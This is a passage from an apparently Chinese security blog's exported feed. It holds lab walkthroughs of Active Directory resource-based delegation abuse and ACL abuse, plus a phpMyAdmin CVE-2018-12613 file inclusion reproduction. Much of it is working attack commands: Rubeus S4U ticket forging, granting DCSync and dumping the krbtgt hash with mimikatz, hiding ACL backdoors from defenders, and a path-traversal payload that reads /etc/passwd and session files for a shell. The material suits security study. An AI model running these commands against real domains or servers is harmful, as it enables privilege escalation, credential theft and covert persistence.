rel="noopener">https://xz.aliyun.com/t/5887</a> CobaltStrike插件开发官方指南 Part1<br><a href="https://xz.aliyun.com/t/5892" target="_blank" rel="noopener">https://xz.aliyun.com/t/5892</a> CobaltStrike插件开发官方指南 Part2<br><a href="https://xz.aliyun.com/t/6188" target="_blank" rel="noopener">https://xz.aliyun.com/t/6188</a> CobaltStrike插件开发官方指南 Part3<br><a href="https://www.cobaltstrike.com/aggressor-script" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script</a> cs官方开发文档<br><a href="http://sleep.dashnine.org/manual" target="_blank" rel="noopener">http://sleep.dashnine.org/manual</a> sleep官方文档</p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>资源委派(提权/横向移动)</title>
      <link href="/posts/c34daaac.html"/>
      <url>/posts/c34daaac.html</url>
      <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=26484368&auto=1&height=66"></iframe><br>早在之前看一篇名为”烂番茄提取”的文章的时候就想复现，后面一直没用成功。昨天在搞ACL的时候发现kerberos资源委派提前权，一看。说的不就是这吗，捣鼓了一下写篇文章</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>利用用户的ACL（msDS-AllowedToActOnBehalfOfOtherIdentity）属性配合kerberos S4U实现凭证伪造<br>（原文章没怎么说原理，烂番茄那篇说的有点复杂。我可能没有描述完整（甚至可能有错误），如果想深入了解原理可以看原文<br><a href="https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/）" target="_blank" rel="noopener">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/）</a></p><p>使用msDS-AllowedToActOnBehalfOfOtherIdentity属性实现横向/提权<br>msDS-AllowedToActOnBehalfOfOtherIdentity介绍：ms-DS允许代表其他身份采取行动</p><p>利用要求：</p><pre><code>* 目标DC是windows server 2012或以上* 域用户拥有ACL GenericAll/GenericWrite/WriteProperty权限（使用目标域用户加入域的时候默认自带这些权限）* 目标机器名称* 域管理用户名称</code></pre><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>domain:YAYI.local (原本叫domain.local那个域被我玩炸了…重装了)<br>域管用户:yayis<br>ip:192.168.113.132 DC<br>ip:192.168.113.223 YYC (域内主机)</p><p>用到的工具：</p><ul><li>powerview</li><li>Powermad</li><li>Rubeus</li><li>mimikatz</li><li>impacket工具套件</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>首先进行ACL权限检测，当前域用户是否有权限创建新的计算机。能利用的ACL为<br>（GenericAll/GenericWrite/WriteProperty）</p><pre><code>import-Module Powerview.ps1Get-ObjectAcl -SamAccountName &quot;YYC&quot; -ResolveGUIDs | out-file save.txt #搜索自己的UID和搜索关键字GenericAll/GenericWrite/WriteProperty</code></pre><p>拥有其中一个ACL权限即可<br><img src="https://s1.ax1x.com/2020/08/03/adfjqx.png" alt=""></p><p>获取域控名称和ip(确定域控版本和系统)</p><pre><code>Get-DomainController</code></pre><p><img src="https://s1.ax1x.com/2020/08/03/adhkQA.png" alt=""></p><p>查询一个域用户最多可以创建多少台计算机</p><pre><code>Get-DomainObject -Identity &quot;dc=YAYI,dc=local&quot; -Domain YAYI.local</code></pre><p><img src="https://s1.ax1x.com/2020/08/03/adhQzj.png" alt=""></p><p>查询目标机的msds-allowedtoactonbehalfofotheridentity是否被写入</p><pre><code>Get-NetComputer YYC | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/adh0SJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/04/adh6w6.png" alt=""></p><p>创建一个计算机用户</p><pre><code>import-module powermadNew-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString &#39;123456&#39; -AsPlainText -Force) -Verbose #新建一个计算机账户，密码为123456。</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/adh4ld.png" alt=""></p><p>查询新创建的计算机用户的SID</p><pre><code>Get-DomainComputer fake01</code></pre><p>SID:S-1-5-21-2210433587-4071140994-1849857373-1122<br><img src="https://s1.ax1x.com/2020/08/04/adhLtS.png" alt=""></p><p>为FAKE01计算机主体创建一个新的原始安全描述符</p><pre><code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)&quot;$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)</code></pre><p>(实验的时候打错SID了就不贴图了)</p><p>修改目标计算机SID</p><pre><code>Get-DomainComputer YYC | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose</code></pre><p>忘记截图了，拿文章的图代替一下。。<br><img src="https://s1.ax1x.com/2020/08/04/ad4aHP.png" alt=""></p><p>提醒-我们之所以能够这样写，是因为Account Operators于安全组进YAYI\Account Operators，尽管唯一重要的/足够的是写权限，但它可以完全控制目标计算机YYC$<br>（原文写的是 Operations用户，不过我找不到这个。到找到了Account Operations）<br><img src="https://s1.ax1x.com/2020/08/04/ad4r9g.png" alt=""></p><p>自己实现时找到的<br><img src="https://s1.ax1x.com/2020/08/04/ad42Bq.png" alt=""></p><p>一旦msds允许作为其他身份被设置，它在这里是可见的<br><img src="https://s1.ax1x.com/2020/08/04/ad4ICF.png" alt=""></p><p>同样的道理也可以这样看</p><pre><code>Get-DomainComputer YYC -Properties &#39;msds-allowedtoactonbehalfofotheridentity&#39;</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad4qD1.png" alt=""></p><p>配置FAKE01的机器绑定到YYC的机器</p><pre><code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2210433587-4071140994-1849857373-1122)&quot; #这里的SID为新加的计算机账户的SID$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-DomainComputer YYC| Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5S8e.png" alt=""></p><p>获取hash</p><pre><code>.\Rubeus.exe hash /password:123456 /user:fake01 /domain:YAYI.local</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5pgH.png" alt=""></p><p>RC4 hash：<strong>32ED87BDB5FDC5E9CBA88547376818D4</strong></p><p>伪造域管理员的凭证导入 （这个凭证只能在YYC上使用）</p><pre><code>.\Rubeus.exe s4u /user:fake01$ /domain:YAYI.local /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:yayis /msdsspn:host/YYC /altservice:cifs,host /ptt #导入cifs和host的票据，不导入host票据无法正常使用spexec ?(host票据包含cifs票据)</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5UxJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/04/ad5dM9.png" alt=""></p><p>如果要在别的机子上使用kerberos的凭证，则需要impacket的pyGet.py或者mimikatz导出ccache</p><pre><code>mimikatz.exe &quot;kerberos::list /export&quot; &quot;exit&quot;</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5sIK.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/04/ad5gRe.png" alt=""></p><p>导入凭证利用，可以使用mimikatz或者set命令</p><pre><code>mimikatz &quot;kerberos::ptc yayis.ccache&quot; &quot;exit&quot;使用set命令，set KRB5CCNAME=yayis.ccache</code></pre><p><img src="https://s1.ax1x.com/2020/08/04/ad5hqI.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/04/ad55Zt.png" alt=""></p><p>其实后面还有一点，这个复现的不是很成功。后面的内容有点乱，写出来容易搞混，就不写了<br>上面提到的ACL一台机器使用域用户连接DC的时候就已经把ACL设置留下来了。我觉得使用powerview<br>对着每台机器查有权限控制这台机器的SID,可以横着走。（纯属理论，实际上有待测验）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object" target="_blank" rel="noopener">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object</a></p><p><a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">https://xz.aliyun.com/t/7454</a></p>]]></content>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>AD域里的ACL攻防</title>
      <link href="/posts/be9dae0a.html"/>
      <url>/posts/be9dae0a.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=484058598&auto=1&height=66"></iframe><p>最近文章都写星球了，所以没怎么更新。昨天看到了安全客一篇说AD域里的ACL攻防<br>学习到了，写篇文章更新一下<br>原文地址：<a href="https://www.anquanke.com/post/id/212163#h3-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212163#h3-19</a><br><strong>注意：有些图和文字来自安全客</strong></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>首先想要了解ACL首先需要了解Access Control Model（访问控制模型），根据官网（<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-model）给出的定义：" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-model）给出的定义：</a><br>访问控制模型能够控制进程访问一些安全对象，或者是控制进程执行各种系统管理任务。原文：The access control model enables you to control the ability of a process to access securable objects or to perform various system administration tasks。<br>用通俗一点的话来说ACM就是一个判断你在一个档案馆（在这里可以理解为整个域）里是否有权限打开某个档案抽屉（用户对象、用户组对象、Computer对象），并且是否能在这个档案抽屉中取走、存放、修改档案（读、写、修改）的一个模型。</p></blockquote><p>访问模型包含哪些部分：<br>1、Access Tokens（访问tokens）<br>2、Security Descriptors（安全描述符）<br>a、Discretionary Access Control List (DACL)<br>b、System Access Control List (SACL)<br>Access Control Lists（ACL）<br>Access Control Entries（ACE）<br>Access Rights and Access Masks（访问权限和访问掩码）</p><p><strong>Access Token</strong><br>当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户，访问令牌包括用户的SID、所在组的SID等等信息</p><p><strong>Security Descriptors安全描述符</strong><br>SID（Security Identifiers）即安全描述符。<br>安全描述符标识对象的所有者，并包含以下访问控制列表：<br>1、Discretionary Access Control List (DACL) 自由访问控制列表<br>2、System Access Control List (SACL) 系统访问控制列表</p><p>每一种控制列表中都存在若干条ACE（Access Control Entries）<br><img src="https://s1.ax1x.com/2020/08/02/aYyOMQ.png" alt=""></p><p>一张图描述<br><img src="https://s1.ax1x.com/2020/08/02/aY6PRU.png" alt=""></p><h2 id="DACL"><a href="#DACL" class="headerlink" title="DACL"></a>DACL</h2><p>高级安全设置中的权限就是DACL的列表<br><img src="https://s1.ax1x.com/2020/08/02/aY61Qe.png" alt=""></p><h2 id="SACL"><a href="#SACL" class="headerlink" title="SACL"></a>SACL</h2><p>高级安全设置中的审核就是SACL的列表<br><img src="https://s1.ax1x.com/2020/08/02/aY62F0.png" alt=""></p><p>其中红色圈出来的每一条都是一条ACE</p><h2 id="ACE"><a href="#ACE" class="headerlink" title="ACE"></a>ACE</h2><p>ACE是针对特定用户或特定组的单个权限授予（或拒绝权利）的配置结构。ACE有许多不同类型，但是在Active Directory的权限中，只有四种不同的含义，两种分别用于授予和拒绝权限。</p><h2 id="Access-Mask"><a href="#Access-Mask" class="headerlink" title="Access Mask"></a>Access Mask</h2><p>Access Mask在ACE中有Access Mask这个字段，它代表着此条ACE所对应的权限，比如完全控制（GenericAll）、修改密码（ResetPassword）、写入属性（WriteMembers）等等。<br><img src="https://s1.ax1x.com/2020/08/02/aYc90A.png" alt=""></p><h2 id="TrusteesTrustees"><a href="#TrusteesTrustees" class="headerlink" title="TrusteesTrustees"></a>TrusteesTrustees</h2><p>TrusteesTrustees的意思为受委托人，受托者是一个ACE所应用到的用户账户，组账户或者是登录会话。也就是说，谁是某一个ACE的受托者，那么这条ACE中的Access Mask所对应的权限（可能是拒绝可能是通过）就会赋予受托者。比如下面这一条的受委托人实际上就是zhangs账号。<br><img src="https://s1.ax1x.com/2020/08/02/aYcEp8.png" alt=""></p><h2 id="AD域里常见可利用的ACl"><a href="#AD域里常见可利用的ACl" class="headerlink" title="AD域里常见可利用的ACl"></a>AD域里常见可利用的ACl</h2><ul><li>GenericAll ：拥有一个可以完全控制用户/组的权限</li><li>GenericWrite ：此权限能够更新目标对象的属性值</li><li>Self-Membership ：这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)</li><li>WriteProperty ：WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限</li><li>WriteOwner ：WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限</li><li>WriteDacl ：WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。</li></ul><h2 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h2><p>ADSI编辑器<br>powerview</p><h2 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h2><p><strong>GenericAll on User</strong><br>使用powerview添加ACL或者手动</p><pre><code class="text">Add-DomainObjectAcl -TargetIdentity zhangs -PrincipalIdentity yayi -Rights All -Verbose</code></pre><p>这个权限可以完全控制用户<br><img src="https://s1.ax1x.com/2020/08/02/aY2ELQ.png" alt=""></p><p>给予了yayi对zhangs用户完全控制的权限，在查看zhangs的时候可以发现yayi的SID在查询里出现了<br><img src="https://s1.ax1x.com/2020/08/02/aY2MWV.png" alt=""></p><p>此时使用yayi的用户可以修改zhangs用户密码<br><img src="https://s1.ax1x.com/2020/08/02/aY21QU.png" alt=""></p><p><strong>GenericAll on Group</strong><br>环境和上文相同，GenericAll on Group说的是对一个组有GenericAll权限，查看用户组domain admins：<br>（yayi是新增加的）<br><img src="https://s1.ax1x.com/2020/08/02/aY2BQO.md.png" alt=""></p><p>powerview将yayi用户添加到domain admins用户添加</p><pre><code class="text">Add-DomainObjectAcl  -TargetIdentity &quot;domain admins&quot; -PrincipalIdentity yayi -Rights  all -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aY22FI.png" alt=""></p><p>添加yayi用户的ACL全部控制权限后查看<br><img src="https://s1.ax1x.com/2020/08/02/aY24l8.png" alt=""></p><p>可以用yayi用户控制domain admins用户组<br><img src="https://s1.ax1x.com/2020/08/02/aY5TmT.png" alt=""></p><h2 id="GenericWrite-写入全部属性"><a href="#GenericWrite-写入全部属性" class="headerlink" title="GenericWrite (写入全部属性)"></a>GenericWrite (写入全部属性)</h2><p>GenericWrite也是在Access Mask中进行标识，此权限能够更新目标对象的属性值，可以使用PowerView中的Set-DomainObject方法设置目标属性的值。<br><img src="https://s1.ax1x.com/2020/08/02/aY5Oh9.png" alt=""></p><blockquote><p>如果您在计算机对象上具有这些特权，那么您可以拉出Kerberos基于资源的受限委托:计算机对象接管。<br>参考链接：<a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution" target="_blank" rel="noopener">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></p></blockquote><p>修改别的属性</p><pre><code>Set-DomainObject zhangs -Set @{&#39;scriptPath&#39;=&#39;雷电芽衣&#39;} -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYop2n.png" alt=""></p><h2 id="WriteDacl"><a href="#WriteDacl" class="headerlink" title="WriteDacl"></a>WriteDacl</h2><p>WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。<br><img src="https://s1.ax1x.com/2020/08/02/aYoGIe.png" alt=""></p><p>个人感觉WriteDacl和GenericWrite没什么区别</p><pre><code>Set-DomainObject zhangs -Set @{&#39;scriptPath&#39;=&#39;雷电女王&#39;} -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYodMt.png" alt=""></p><h2 id="Self-Membership"><a href="#Self-Membership" class="headerlink" title="Self-Membership"></a>Self-Membership</h2><p>这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)<br>重点：主体、添加/删除自身作为成员</p><p><img src="https://s1.ax1x.com/2020/08/02/aYohLV.png" alt=""></p><p>此时查看dnsadmins用户组可以看到test用户的sid在dnsadmins里看到了<br><img src="https://s1.ax1x.com/2020/08/02/aYoHJJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/02/aYoqzR.png" alt=""></p><h2 id="WriteProperty-Self-Membership"><a href="#WriteProperty-Self-Membership" class="headerlink" title="WriteProperty (Self-Membership)"></a>WriteProperty (Self-Membership)</h2><p>WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限，在Domain Admins组里设置zhangs账户的WriteProperty权限<br>WriteProperty和Self-Membership一样 (设置的地方一模一样或者直接设置权限为：添加/删除自身作为成员)<br>（也可以添加其他用户进控制的组）</p><p><img src="https://s1.ax1x.com/2020/08/02/aYT9Fe.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/08/02/aYTkQI.md.png" alt=""></p><h2 id="WriteProperty-on-Group"><a href="#WriteProperty-on-Group" class="headerlink" title="WriteProperty on Group"></a>WriteProperty on Group</h2><p>WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限：<br>CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner<br>设置一个组的写入全部属性<br>（相当于获取了这个组的所有权限）<br><img src="https://s1.ax1x.com/2020/08/02/aYT8O0.png" alt=""></p><h2 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h2><p>WriteOwner权限允许委托人修改对象的安全描述符的所有者部分。也就是说，假如用户A对administrator用户有这个权限，那么A能利用这个权限给自己附加其他的权限。</p><p>将zhangs用户的所有者设置为test，并给予test用户完全的控制权限</p><pre><code>Set-DomainObjectOwner -Identity S-1-5-21-447451162-2905414466-2158217208-1149 -OwnerIdentity &quot;test&quot; -VerboseAdd-DomainObjectAcl -TargetIdentity zhangs -PrincipalIdentity test -Rights All -Verbose</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYT0p9.png" alt=""></p><h2 id="给一个用户添加DCSync权限"><a href="#给一个用户添加DCSync权限" class="headerlink" title="给一个用户添加DCSync权限"></a>给一个用户添加DCSync权限</h2><p>给予test用户：复制目录更改Replicating Directory Changes (DS-Replication-Get-Changes)、 复制目录更改所有Replicating Directory Changes All (DS-Replication-Get-Changes-All)（Exchange用的就是这个）权限</p><pre><code>Add-DomainObjectAcl -TargetIdentity &quot;DC=DOMAIN,DC=local&quot; -PrincipalIdentity test -Rights DCSync</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYT70f.png" alt=""></p><p>使用mimikatz导出krbtgt用户的hash</p><pre><code>mimikatz.exe &quot;lsadump::dcsync /user:DOMAIN\krbtgt&quot; &quot;exit&quot;</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aY7pn0.png" alt=""></p><p><strong>Invoke-ACLPwn</strong><br>运行时需要.NET 3.5环境，Windows Server 2012安装遇到报错，最后的解决方法(需要在网上下载SxS的安装包<a href="https://pan.baidu.com/share/init?surl=kDgdYerM0lVB32Q_IEqLUw提取码：gwzk)：" target="_blank" rel="noopener">https://pan.baidu.com/share/init?surl=kDgdYerM0lVB32Q_IEqLUw提取码：gwzk)：</a></p><p>dism.exe /online /enable-feature /all /featurename:NetFX3 /Source:F:\Sources\SxS\</p><p>GitHub地址：<a href="https://github.com/fox-it/Invoke-ACLPwn" target="_blank" rel="noopener">https://github.com/fox-it/Invoke-ACLPwn</a><br>背景信息在发布者博客上：<a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a><br>环境需要：</p><p>.NET 3.5 + sharphound.exe + mimikatz.exe</p><p>用法示例：</p><pre><code>.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn &#39;Administrator&#39;.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username &#39;testuser&#39; -Domain &#39;xenoflux.local&#39; -Password &#39;Welcome01!&#39;</code></pre><p>使用第一条标识了-NoDCSync（不会做DCSync的动作，只判断是否能够存在能够DCSync的权限）的命令<br>administrator用户检测出来了其他用户报错<br><img src="https://s1.ax1x.com/2020/08/02/aY7uB6.png" alt=""></p><p>文章上的图<br><img src="https://s1.ax1x.com/2020/08/02/aY7Lb6.png" alt=""></p><h2 id="针对DACL的隐身方式"><a href="#针对DACL的隐身方式" class="headerlink" title="针对DACL的隐身方式"></a>针对DACL的隐身方式</h2><p>通过隐藏账户可以掩盖主体本身，阻止防御者轻易的发现谁实际上拥有ACE中指定的权限。这种方式主要应对的是对于高危的ACL进行扫描行为。<br>隐藏用户</p><p>1、将要隐藏的用户所有者改为攻击者或者攻击者控制的账户<br>2、设置一条拒绝完全控制的ACE<br>添加SELF用户和Everyone用户拒绝类型，将要修改的组/用户名的所有者改为攻击者控制的用户名<br><img src="https://s1.ax1x.com/2020/08/02/aYHgRH.png" alt=""><br>之后就会变成一片空白,powerview也查不到</p><pre><code>Get-DomainObjectAcl -Identity user01 -domain DOMAIN.local -Resolve</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYblSH.md.png" alt=""></p><h2 id="各种ACL后门"><a href="#各种ACL后门" class="headerlink" title="各种ACL后门"></a>各种ACL后门</h2><pre><code>* GPO ACL后门* ACL Dcsync后门</code></pre><p>具体参考文章</p><h2 id="防御ACL修改"><a href="#防御ACL修改" class="headerlink" title="防御ACL修改"></a>防御ACL修改</h2><p>关注日志里的5136事件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/212163#h3-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212163#h3-19</a><br><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces" target="_blank" rel="noopener">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</a></p>]]></content>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2018-12613phpmyadmin本地文件包含复现</title>
      <link href="/posts/299f8a4a.html"/>
      <url>/posts/299f8a4a.html</url>
      <content type="html"><![CDATA[<p>最近看到某文章提到了，最近在学代码审计顺便看看<br>漏洞影响</p><ul><li>4.8.0</li><li>4.8.0.1</li><li>4.8.1</li></ul><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>phpmyadmin 4.8.1<br>这里直接用的靶场<a href="https://store.vsplate.com/" target="_blank" rel="noopener">https://store.vsplate.com/</a></p><h2 id="代码刨析"><a href="#代码刨析" class="headerlink" title="代码刨析"></a>代码刨析</h2><p>问题出现在index.php第61行<br>(index.php 55行~63行)</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;]; //问题出现在这    exit;}</code></pre><p>这段代码的内容为：</p><ul><li>$_REQUEST[‘target’]参数为字符串类型</li><li>$_REQUEST[‘target’]参数不存在index关键字</li><li>$_REQUEST[‘target’]参数不存在黑名单$target_blacklist</li><li>checkPageValidity函数返回True</li></ul><p>checkPageValidity函数代码<br>(Core.php 443~476行)</p><pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = []){    if (empty($whitelist)) {        $whitelist = self::$goto_whitelist; //白名单    }    if (! isset($page) || !is_string($page)) { //$page参数不存在，不是string类型        return false;    }    if (in_array($page, $whitelist)) { //$page参数在白名单里 （无法利用，没对$page参数做任何取值判断）        return true;    }    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    ); //取第一个字符到?号前一个位置的内容    if (in_array($_page, $whitelist)) { //$page里面的参数是否在白名单内 （无法利用，$page参数带?就会被php认为php里的参数）        return true;    }    $_page = urldecode($page); //url解码    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    ); //取第一个字符到?号前一个位置的内容    if (in_array($_page, $whitelist)) { //url解码后判断$page里面的参数是否在白名单内 （可以利用，因为url编码绕过了上面所描述的问题）        return true;    }    return false;}</code></pre><p>白名单</p><pre><code class="php">public static $goto_whitelist = array(    &#39;db_datadict.php&#39;,    &#39;db_sql.php&#39;,    &#39;db_events.php&#39;,    &#39;db_export.php&#39;,    &#39;db_importdocsql.php&#39;,    &#39;db_multi_table_query.php&#39;,    &#39;db_structure.php&#39;,    &#39;db_import.php&#39;,    &#39;db_operations.php&#39;,    &#39;db_search.php&#39;,    &#39;db_routines.php&#39;,    &#39;export.php&#39;,    &#39;import.php&#39;,    &#39;index.php&#39;,    &#39;pdf_pages.php&#39;,    &#39;pdf_schema.php&#39;,    &#39;server_binlog.php&#39;,    &#39;server_collations.php&#39;,    &#39;server_databases.php&#39;,    &#39;server_engines.php&#39;,    &#39;server_export.php&#39;,    &#39;server_import.php&#39;,    &#39;server_privileges.php&#39;,    &#39;server_sql.php&#39;,    &#39;server_status.php&#39;,    &#39;server_status_advisor.php&#39;,    &#39;server_status_monitor.php&#39;,    &#39;server_status_queries.php&#39;,    &#39;server_status_variables.php&#39;,    &#39;server_variables.php&#39;,    &#39;sql.php&#39;,    &#39;tbl_addfield.php&#39;,    &#39;tbl_change.php&#39;,    &#39;tbl_create.php&#39;,    &#39;tbl_import.php&#39;,    &#39;tbl_indexes.php&#39;,    &#39;tbl_sql.php&#39;,    &#39;tbl_export.php&#39;,    &#39;tbl_operations.php&#39;,    &#39;tbl_structure.php&#39;,    &#39;tbl_relation.php&#39;,    &#39;tbl_replace.php&#39;,    &#39;tbl_row_action.php&#39;,    &#39;tbl_select.php&#39;,    &#39;tbl_zoom_select.php&#39;,    &#39;transformation_overview.php&#39;,    &#39;transformation_wrapper.php&#39;,    &#39;user_password.php&#39;,);</code></pre><p>利用的payload</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd当解析到/../../../../../../../../etc/passwd会进行包含，实现利用</code></pre><p>验证是否存在包含</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></pre><p><img src="https://s1.ax1x.com/2020/07/21/UojReJ.png" alt=""></p><p>利用session文件getshell （方法有很多）<br>（在cookie找到phpmyadmin参数）</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_01876fad4b7e3596a65aa96048b99def #有些是/tmp路径有些是别的路径被这个坑的老惨了</code></pre><p><img src="https://s1.ax1x.com/2020/07/21/UojIW6.png" alt=""></p><p>新版phpmyadmin修复代码</p><pre><code class="php">if (isset($GLOBALS[&#39;target&#39;]) &amp;&amp; is_string($GLOBALS[&#39;target&#39;]) &amp;&amp; !empty($GLOBALS[&#39;target&#39;]) &amp;&amp; in_array($GLOBALS[&#39;target&#39;], $goto_whitelist)) {    $main_target = $GLOBALS[&#39;target&#39;];}</code></pre><p>参考链接：<a href="https://blog.csdn.net/qq_34444097/article/details/85264686" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/85264686</a></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>最简单的方法更改jar包(修改冰蝎)</title>
      <link href="/posts/44a65413.html"/>
      <url>/posts/44a65413.html</url>
